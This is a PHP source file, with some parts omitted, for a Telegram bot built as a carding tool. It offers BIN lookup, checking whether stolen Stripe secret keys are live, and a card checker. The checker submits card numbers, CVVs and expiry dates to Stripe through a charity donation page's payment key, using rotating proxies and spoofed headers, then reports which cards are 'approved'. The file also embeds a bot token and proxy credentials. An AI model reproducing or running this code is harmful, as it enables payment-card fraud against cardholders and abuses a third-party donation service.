...
////////////////=============[Made with ❤️ by MUHAMMAD RAFLI AUFA]===============////////////////

///https://api.telegram.org/bot<token>/setwebhook?url=<url>



$botToken = "1583578855:AAHb4S6ohs6ko87dk5JkV2h4dR-EOfKGexE"; // Enter ur bot token
...
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: MUHAMMAD RAFLI AUFA</b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA</b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA </b>");
}
...
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA </b>');
}
curl_close($ch);
...
$rp1 = array(
  1 => 'fwjpokbl-rotate:8wcltm7wv8ax',
  2 => 'fwjpokbl-rotate:8wcltm7wv8ax',
  3 => 'fwjpokbl-rotate:8wcltm7wv8ax',
  4 => 'fwjpokbl-rotate:8wcltm7wv8ax',
  5 => 'fwjpokbl-rotate:8wcltm7wv8ax',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[currency]=INR&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5c9ad5f6c%3B+stripe-js-v3%2F5c9ad5f6c&time_on_page=280009&referrer=https%3A%2F%2Fecoquest.raisely.com%2F&key=pk_live_IuO9apxOM1AclLg9TOTxjUS0&pasted_fields=number');
...
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.raisely.com/v3/donations?campaign=b85298b0-e67e-11ea-ad8a-39b60e8cf0a2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.raisely.com',
'method: POST',
'path: /v3/donations?campaign=b85298b0-e67e-11ea-ad8a-39b60e8cf0a2',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'origin: https://ecoquest.raisely.com',
'referer: https://ecoquest.raisely.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: '.$ua.'',
...
curl_setopt($ch, CURLOPT_POSTFIELDS,'{"data":{"method":"CREDIT_CARD","anonymous":true,"interval":"ONCE","count":1,"amount":130800,"otherAmount":"","feeOptIn":true,"items":[],"currency":"INR","email":"'.$email.'","firstName":"'.$firstname.'","lastName":"'.$lastname.'","profileUuid":"b8564230-e67e-11ea-ad8a-39b60e8cf0a2","campaignUuid":"b85298b0-e67e-11ea-ad8a-39b60e8cf0a2","type":"ONLINE","fee":5064,"token":"'.$id.'"}}');
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA</b>');
}
...
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: MUHAMMAD RAFLI AUFA </b>");
}}
